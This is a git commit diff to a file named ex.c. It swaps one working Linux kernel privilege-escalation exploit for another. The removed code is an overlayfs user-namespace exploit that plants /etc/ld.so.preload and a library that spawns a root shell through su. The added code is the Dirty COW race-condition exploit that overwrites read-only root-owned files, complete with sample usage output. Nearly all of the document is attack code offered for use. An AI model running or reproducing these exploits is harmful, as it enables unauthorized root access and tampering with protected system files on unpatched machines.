cf56e0806be4157742542ec214d609ff386659d6
LOURC0D3 <lourc0d3@gmail.com>
2023-07-30 03:35:06 +0900

    1

--- ex.c
+++ ex.c
@@ -1,120 +1,114 @@
+/*
+####################### dirtyc0w.c #######################
+$ sudo -s
+# echo this is not a test > foo
+# chmod 0404 foo
+$ ls -lah foo
+-r-----r-- 1 root root 19 Oct 20 15:23 foo
+$ cat foo
+this is not a test
+$ gcc -pthread dirtyc0w.c -o dirtyc0w
+$ ./dirtyc0w foo m00000000000000000
+mmap 56123000
+madvise 0
+procselfmem 1800000000
+$ cat foo
+m00000000000000000
+####################### dirtyc0w.c #######################
+*/
 #include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <sched.h>
-#include <sys/stat.h>
-#include <sys/types.h>
-#include <sys/mount.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <sched.h>
-#include <sys/stat.h>
-#include <sys/types.h>
-#include <sys/mount.h>
-#include <sys/types.h>
-#include <signal.h>
+#include <sys/mman.h>
 #include <fcntl.h>
+#include <pthread.h>
+#include <unistd.h>
+#include <sys/stat.h>
 #include <string.h>
-#include <linux/sched.h>
+#include <stdint.h>
 
-#define LIB "#include <unistd.h>\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n{\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \"getuid\");\nreadlink(\"/proc/self/exe\", (char *) &path, 128);\nif(geteuid() == 0 && !strcmp(path, \"/bin/su\")) {\nunlink(\"/etc/ld.so.preload\");unlink(\"/tmp/ofs-lib.so\");\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\"/bin/sh\", \"sh\", \"-i\", NULL, NULL);\n}\n    return _real_getuid();\n}\n"
-
-static char child_stack[1024*1024];
-
-static int
-child_exec(void *stuff)
+void *map;
+int f;
+struct stat st;
+char *name;
+ 
+void *madviseThread(void *arg)
 {
-    char *file;
-    system("rm -rf /tmp/ns_sploit");
-    mkdir("/tmp/ns_sploit", 0777);
-    mkdir("/tmp/ns_sploit/work", 0777);
-    mkdir("/tmp/ns_sploit/upper",0777);
-    mkdir("/tmp/ns_sploit/o",0777);
-
-    fprintf(stderr,"mount #1\n");
-    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper") != 0) {
-// workdir= and "overlay" is needed on newer kernels, also can't use /proc as lower
-        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work") != 0) {
-            fprintf(stderr, "no FS_USERNS_MOUNT for overlayfs on this kernel\n");
-            exit(-1);
-        }
-        file = ".access";
-        chmod("/tmp/ns_sploit/work/work",0777);
-    } else file = "ns_last_pid";
-
-    chdir("/tmp/ns_sploit/o");
-    rename(file,"ld.so.preload");
-
-    chdir("/");
-    umount("/tmp/ns_sploit/o");
-    fprintf(stderr,"mount #2\n");
-    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc") != 0) {
-        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work") != 0) {
-            exit(-1);
-        }
-        chmod("/tmp/ns_sploit/work/work",0777);
-    }
-
-    chmod("/tmp/ns_sploit/o/ld.so.preload",0777);
-    umount("/tmp/ns_sploit/o");
+  char *str;
+  str=(char*)arg;
+  int i,c=0;
+  for(i=0;i<100000000;i++)
+  {
+/*
+You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
+> This is achieved by racing the madvise(MADV_DONTNEED) system call
+> while having the page of the executable mmapped in memory.
+*/
+    c+=madvise(map,100,MADV_DONTNEED);
+  }
+  printf("madvise %d\n\n",c);
 }
-
-int
-main(int argc, char **argv)
+ 
+void *procselfmemThread(void *arg)
 {
-    int status, fd, lib;
-    pid_t wrapper, init;
-    int clone_flags = CLONE_NEWNS | SIGCHLD;
-
-    fprintf(stderr,"spawning threads\n");
-
-    if((wrapper = fork()) == 0) {
-        if(unshare(CLONE_NEWUSER) != 0)
-            fprintf(stderr, "failed to create new user namespace\n");
-
-        if((init = fork()) == 0) {
-            pid_t pid =
-                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
-            if(pid < 0) {
-                fprintf(stderr, "failed to create new mount namespace\n");
-                exit(-1);
-            }
-
-            waitpid(pid, &status, 0);
-
-        }
-
-        waitpid(init, &status, 0);
-        return 0;
-    }
-
-    usleep(300000);
-
-    wait(NULL);
-
-    fprintf(stderr,"child threads done\n");
-
-    fd = open("/etc/ld.so.preload",O_WRONLY);
-
-    if(fd == -1) {
-        fprintf(stderr,"exploit failed\n");
-        exit(-1);
-    }
-
-    fprintf(stderr,"/etc/ld.so.preload created\n");
-    fprintf(stderr,"creating shared library\n");
-    lib = open("/tmp/ofs-lib.c",O_CREAT|O_WRONLY,0777);
-    write(lib,LIB,strlen(LIB));
-    close(lib);
-    lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
-    if(lib != 0) {
-        fprintf(stderr,"couldn't create dynamic library\n");
-        exit(-1);
-    }
-    write(fd,"/tmp/ofs-lib.so\n",16);
-    close(fd);
-    system("rm -rf /tmp/ns_sploit /tmp/ofs-lib.c");
-    execl("/bin/su","su",NULL);
+  char *str;
+  str=(char*)arg;
+/*
+You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
+>  The in the wild exploit we are aware of doesn't work on Red Hat
+>  Enterprise Linux 5 and 6 out of the box because on one side of
+>  the race it writes to /proc/self/mem, but /proc/self/mem is not
+>  writable on Red Hat Enterprise Linux 5 and 6.
+*/
+  int f=open("/proc/self/mem",O_RDWR);
+  int i,c=0;
+  for(i=0;i<100000000;i++) {
+/*
+You have to reset the file pointer to the memory position.
+*/
+    lseek(f,(uintptr_t) map,SEEK_SET);
+    c+=write(f,str,strlen(str));
+  }
+  printf("procselfmem %d\n\n", c);
 }
-            
+ 
+ 
+int main(int argc,char *argv[])
+{
+/*
+You have to pass two arguments. File and Contents.
+*/
+  if (argc<3) {
+  (void)fprintf(stderr, "%s\n",
+      "usage: dirtyc0w target_file new_content");
+  return 1; }
+  pthread_t pth1,pth2;
+/*
+You have to open the file in read only mode.
+*/
+  f=open(argv[1],O_RDONLY);
+  fstat(f,&st);
+  name=argv[1];
+/*
+You have to use MAP_PRIVATE for copy-on-write mapping.
+> Create a private copy-on-write mapping.  Updates to the
+> mapping are not visible to other processes mapping the same
+> file, and are not carried through to the underlying file.  It
+> is unspecified whether changes made to the file after the
+> mmap() call are visible in the mapped region.
+*/
+/*
+You have to open with PROT_READ.
+*/
+  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
+  printf("mmap %zx\n\n",(uintptr_t) map);
+/*
+You have to do it on two threads.
+*/
+  pthread_create(&pth1,NULL,madviseThread,argv[1]);
+  pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
+/*
+You have to wait for the threads to finish.
+*/
+  pthread_join(pth1,NULL);
+  pthread_join(pth2,NULL);
+  return 0;
+}
